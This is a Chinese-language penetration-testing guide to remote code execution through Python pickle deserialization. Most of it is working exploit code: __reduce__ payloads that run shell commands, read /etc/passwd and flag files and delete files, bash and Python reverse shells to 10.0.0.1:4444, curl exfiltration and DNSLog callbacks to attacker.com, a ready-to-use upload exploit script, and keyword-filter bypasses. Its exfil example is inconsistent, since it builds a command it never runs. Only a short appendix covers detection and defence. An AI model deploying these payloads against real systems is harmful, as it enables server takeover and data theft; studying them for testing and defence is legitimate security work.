# Python Pickle 不安全反序列化 RCE 攻击

## 第一部分：文档概述

### 1.1 编写目的
本方法论为渗透测试人员提供系统化的 Python Pickle 反序列化漏洞检测与利用指南。当应用使用 `pickle.loads()` 或 `pickle.load()` 处理不可信数据时，攻击者可以构造恶意 payload 在反序列化过程中执行任意 Python 代码，实现 Remote Code Execution (RCE)。

### 1.2 适用范围
- Python Web 应用（FastAPI、Flask、Django）接受文件上传并反序列化
- 使用 pickle 存储/加载会话数据的应用
- 使用 pickle 缓存数据的系统（Redis、Memcached）
- 接受序列化对象的 API 接口
- CTF 挑战中涉及 Python 反序列化的场景

### 1.3 读者对象
- 渗透测试工程师
- 安全研究人员
- 代码审计人员
- Python 应用开发者

---

## 第二部分：核心渗透技术专题

### 专题：Python Pickle 反序列化 RCE 攻击

#### 2.1 技术介绍

**漏洞原理：**
Python 的 pickle 模块是 Python 原生的序列化协议，但它**不是安全的**。pickle 在反序列化过程中会执行 payload 中嵌入的指令，这是设计特性而非 bug。

**核心机制：**
pickle 使用一种基于栈的虚拟机来序列化和反序列化对象。在反序列化时，pickle 会执行以下操作码（opcodes）：
- `REDUCE`：调用函数，从栈中弹出函数和参数，执行函数调用
- `BUILD`：构建对象，调用 `__setstate__` 或 `__dict__.update()`
- `INST`：实例化类，执行 `__init__` 方法

**危险根源：**
任何实现了 `__reduce__` 或 `__reduce_ex__` 方法的对象，在序列化时会返回一个可调用对象和参数元组。反序列化时，pickle 会执行这个可调用对象。

```python
# 正常序列化
import pickle
data = pickle.dumps({"key": "value"})
result = pickle.loads(data)  # 安全

# 危险的反序列化
malicious_data = pickle.dumps(MaliciousClass())
pickle.loads(malicious_data)  # 执行 __reduce__ 中的代码！
```

**常见危险函数：**
| 函数 | 危险等级 | 说明 |
|------|---------|------|
| `pickle.loads()` | CRITICAL | 从字节数据反序列化 |
| `pickle.load()` | CRITICAL | 从文件对象反序列化 |
| `cPickle.loads()` | CRITICAL | C 实现版本（Python 2） |
| `dill.loads()` | CRITICAL | 扩展的 pickle 库 |
| `shelve.open()` | HIGH | 使用 pickle 的持久化存储 |

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **文件上传功能** | 用户上传 pickle 文件进行数据处理 | 后端直接 `pickle.loads(file.read())` 无验证 |
| **会话存储** | Flask 使用 sessions 存储用户状态 | 客户端 session cookie 可被篡改反序列化 |
| **缓存系统** | Redis/Memcached 缓存 Python 对象 | 缓存数据被污染后反序列化 |
| **消息队列** | Celery/RabbitMQ 传递序列化任务 | 消息内容被篡改 |
| **API 接口** | 接受序列化对象的 REST API | 请求体包含恶意 pickle 数据 |
| **数据导入** | 批量导入 pickle 格式数据 | 导入文件来源不可信 |
| **CTF 挑战** | 故意设计的反序列化漏洞 | 教育性质的漏洞利用场景 |

**FastAPI 文件上传场景示例：**
```python
from fastapi import FastAPI, UploadFile, File
import pickle

app = FastAPI()

@app.post("/upload")
async def upload_pickle(pickle_file: UploadFile = File(...)):
    # 危险！用户可控文件直接反序列化
    data = pickle.loads(await pickle_file.read())
    return {"status": "loaded"}
```

#### 2.3 漏洞探测方法

##### 2.3.1 黑盒测试

**输入点识别：**
1. **文件上传字段** - 查找接受 `.pkl`、`.pickle`、`.dat` 文件的上传点
2. **Cookie/Session** - 检查是否有 Base64 编码的序列化数据
3. **API 参数** - 查找接受序列化数据的 JSON 字段
4. **缓存键值** - Redis/Memcached 中存储的序列化对象

**探测步骤：**

**步骤 1：识别 pickle 数据格式**
```python
# Pickle 数据以特定字节开头
# Protocol 0: ( 开头
# Protocol 1: \x80\x01 开头
# Protocol 2: \x80\x02 开头
# Protocol 3: \x80\x03 开头
# Protocol 4: \x80\x04 开头
# Protocol 5: \x80\x05 开头
```

**步骤 2：发送探测 payload**
```python
import pickle
import requests

# 探测 payload - 如果返回错误包含 pickle 相关信息，说明存在 pickle 处理
class Probe:
    def __reduce__(self):
        return (print, ("PICKLE_PROBE",))

payload = pickle.dumps(Probe())
response = requests.post("http://target/upload", files={"file": payload})
```

**步骤 3：观察响应**
- 应用崩溃/500 错误 → 可能存在反序列化
- 错误信息包含 "pickle"、"unpickling"、"EOF" → 确认 pickle 处理
- 响应时间异常 → 可能执行了耗时操作

##### 2.3.2 白盒测试

**代码审计关键词：**
```python
# 危险导入
import pickle
import cPickle  # Python 2
import dill
import shelve

# 危险函数调用
pickle.loads(...)
pickle.load(...)
cPickle.loads(...)
dill.loads(...)
shelve.open(...)

# 检查输入来源
await file.read()  # 文件上传
request.cookies[...]  # Cookie
redis.get(...)  # 缓存
```

**数据流追踪：**
1. 找到所有 `pickle.loads()` 调用点
2. 追溯传入数据的来源
3. 确认是否来自用户可控输入
4. 检查是否有验证/过滤机制

#### 2.4 漏洞利用方法

##### 2.4.1 基础 RCE Payload

**方法 1：使用 `os.system` 执行系统命令**
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ("id",))

payload = pickle.dumps(RCE())
```

**方法 2：使用 `subprocess.check_output` 获取命令输出**
```python
import pickle
import subprocess

class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (["id"],))

payload = pickle.dumps(RCE())
```

**方法 3：使用 `eval` 执行 Python 代码**
```python
import pickle

class RCE:
    def __reduce__(self):
        return (eval, ("__import__('os').system('id')",))

payload = pickle.dumps(RCE())
```

##### 2.4.2 信息收集

**获取系统信息：**
```python
import pickle
import os

class InfoGather:
    def __reduce__(self):
        cmd = """
        whoami; 
        uname -a; 
        pwd; 
        ls -la; 
        cat /etc/passwd
        """
        return (os.system, (cmd,))

payload = pickle.dumps(InfoGather())
```

**读取敏感文件：**
```python
import pickle

class ReadFlag:
    def __reduce__(self):
        return (print, (open("/app/flag.txt").read(),))

payload = pickle.dumps(ReadFlag())
```

##### 2.4.3 文件系统操作

**删除文件（CTF 常见场景）：**
```python
import pickle
import os

class DeleteDecoy:
    def __reduce__(self):
        return (os.system, ("rm /app/decoy.txt",))

payload = pickle.dumps(DeleteDecoy())
```

**写入文件：**
```python
import pickle
import os

class WriteFile:
    def __reduce__(self):
        return (os.system, ("echo 'PWNED' > /app/proof.txt",))

payload = pickle.dumps(WriteFile())
```

**读取并外带文件内容：**
```python
import pickle
import urllib.request

class ExfilFile:
    def __reduce__(self):
        cmd = "curl http://attacker.com/?data=$(cat /app/flag.txt | base64)"
        return (urllib.request.urlopen, ("http://attacker.com",))

payload = pickle.dumps(ExfilFile())
```

##### 2.4.4 建立反向 Shell

**Bash 反向 Shell：**
```python
import pickle
import os

class ReverseShell:
    def __reduce__(self):
        cmd = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        return (os.system, (cmd,))

payload = pickle.dumps(ReverseShell())
```

**Python 反向 Shell：**
```python
import pickle
import socket
import subprocess
import os

class PythonShell:
    def __reduce__(self):
        code = """
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
"""
        return (exec, (code,))

payload = pickle.dumps(PythonShell())
```

##### 2.4.5 完整利用脚本

```python
#!/usr/bin/env python3
"""
Python Pickle RCE 利用脚本
用法：python3 exploit.py http://target/upload
"""

import pickle
import os
import sys
import requests

class Exploit:
    def __init__(self, command):
        self.command = command
    
    def __reduce__(self):
        return (os.system, (self.command,))

def create_payload(command):
    """创建恶意 pickle payload"""
    return pickle.dumps(Exploit(command))

def exploit(target_url, command):
    """发送 payload 到目标"""
    payload = create_payload(command)
    
    response = requests.post(
        target_url,
        files={"pickle_file": ("payload.pkl", payload)},
        headers={"Content-Type": "multipart/form-data"}
    )
    
    print(f"[*] Response Status: {response.status_code}")
    print(f"[*] Response Body: {response.text[:500]}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 exploit.py <target_url> <command>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    command = sys.argv[2]
    
    exploit(target_url, command)
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 绕过文件类型检查

**场景：** 应用检查文件扩展名但不验证内容

**绕过方法：**
```python
# 使用正常扩展名
payload = pickle.dumps(Exploit("id"))
with open("data.dat", "wb") as f:
    f.write(payload)

# 或者伪装成其他格式
with open("config.txt", "wb") as f:
    f.write(payload)
```

##### 2.5.2 绕过内容检查

**场景：** 应用检查文件魔数（magic bytes）

**绕过方法 - 添加伪装的头部：**
```python
import pickle

class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))

payload = pickle.dumps(Exploit())

# 添加伪装的头部
fake_header = b"# Python pickle data\n# Generated by application\n"
malicious_file = fake_header + payload

with open("data.pkl", "wb") as f:
    f.write(malicious_file)
```

##### 2.5.3 无回显利用（盲注）

**场景：** 应用不返回命令执行结果

**方法 1：DNSLog 外带**
```python
import pickle
import os

class BlindRCE:
    def __reduce__(self):
        # 使用 curl 将结果发送到 DNSLog
        return (os.system, ("curl http://$(whoami).attacker.com",))

payload = pickle.dumps(BlindRCE())
```

**方法 2：时间延迟探测**
```python
import pickle
import os

class TimeBasedRCE:
    def __reduce__(self):
        return (os.system, ("sleep 5",))

payload = pickle.dumps(TimeBasedRCE())
```

**方法 3：文件状态探测**
```python
import pickle
import os

class FileProbe:
    def __reduce__(self):
        # 创建文件作为执行证明
        return (os.system, ("touch /tmp/pwned",))

payload = pickle.dumps(FileProbe())
```

##### 2.5.4 绕过关键字过滤

**场景：** 应用过滤 `os`、`system`、`eval` 等关键字

**绕过方法 1：使用 `__import__` 动态导入**
```python
import pickle

class Bypass:
    def __reduce__(self):
        code = """
m = __import__('os')
s = getattr(m, 'system')
s('id')
"""
        return (exec, (code,))

payload = pickle.dumps(Bypass())
```

**绕过方法 2：使用 `getattr` 间接调用**
```python
import pickle

class Bypass:
    def __reduce__(self):
        return (
            getattr,
            (__import__('os'), 'system', 'id')
        )

payload = pickle.dumps(Bypass())
```

**绕过方法 3：使用 `operator` 模块**
```python
import pickle

class Bypass:
    def __reduce__(self):
        import operator
        return (
            operator.attrgetter('system'),
            (__import__('os'),)
        )

payload = pickle.dumps(Bypass())
```

---

## 第三部分：附录

### 3.1 常用 Payload 速查表

| 目标 | Payload | 说明 |
|------|--------|------|
| **执行命令** | `(os.system, ("id",))` | 基础命令执行 |
| **读取文件** | `(print, (open("flag.txt").read(),))` | 读取并打印文件 |
| **删除文件** | `(os.system, ("rm file.txt",))` | 删除指定文件 |
| **写入文件** | `(os.system, ("echo data > file",))` | 写入文件 |
| **反向 Shell** | `(os.system, ("bash -i >& /dev/tcp/IP/PORT 0>&1",))` | 建立反向 Shell |
| **Python 代码** | `(exec, ("code_string",))` | 执行 Python 代码 |
| **Eval 执行** | `(eval, ("__import__('os').system('id')",))` | 使用 eval 执行 |
| **Subprocess** | `(subprocess.check_output, (["id"],))` | 获取命令输出 |
| **DNSLog 外带** | `(os.system, ("curl http://$(cmd).attacker.com",))` | 无回显利用 |

### 3.2 Pickle 协议版本

| 协议版本 | Python 版本 | 标识字节 | 特性 |
|---------|------------|---------|------|
| Protocol 0 | 所有版本 | `(` | 人类可读格式 |
| Protocol 1 | 所有版本 | `\x80\x01` | 旧二进制格式 |
| Protocol 2 | 2.3+ | `\x80\x02` | 支持新式类 |
| Protocol 3 | 3.0+ | `\x80\x03` | Python 3 默认 |
| Protocol 4 | 3.4+ | `\x80\x04` | 支持大对象 |
| Protocol 5 | 3.8+ | `\x80\x05` | 支持 out-of-band 数据 |

### 3.3 检测工具

**Pickle 分析工具：**
```bash
# 使用 pickletools 分析 pickle 文件
python3 -m pickletools payload.pkl

# 查看 pickle 内容（不执行）
python3 -c "import pickletools; pickletools.dis(open('payload.pkl','rb'))"
```

**自动化检测脚本：**
```python
import pickle
import pickletools
import io

def analyze_pickle(data):
    """分析 pickle payload 而不执行"""
    print("Pickle 协议分析:")
    pickletools.dis(io.BytesIO(data))
```

### 3.4 防御建议

**对于开发者：**
1. **永远不要反序列化不可信数据** - 这是唯一安全的做法
2. **使用安全的序列化格式** - 如 JSON、MessagePack
3. **实施输入验证** - 验证文件类型、大小、内容
4. **最小权限原则** - 运行应用使用最低权限账户
5. **网络隔离** - 限制应用的网络访问能力

**对于渗透测试人员：**
1. **优先寻找反序列化点** - 文件上传、Cookie、缓存
2. **白盒审计优先** - 直接搜索 `pickle.loads` 调用
3. **注意间接调用** - 通过 shelve、dill 等库
4. **记录利用痕迹** - 便于后续清理和报告

---

**文档版本：** 1.0  
**最后更新：** 2026 年 3 月  
**适用场景：** Python Web 应用渗透测试、CTF 挑战、代码审计
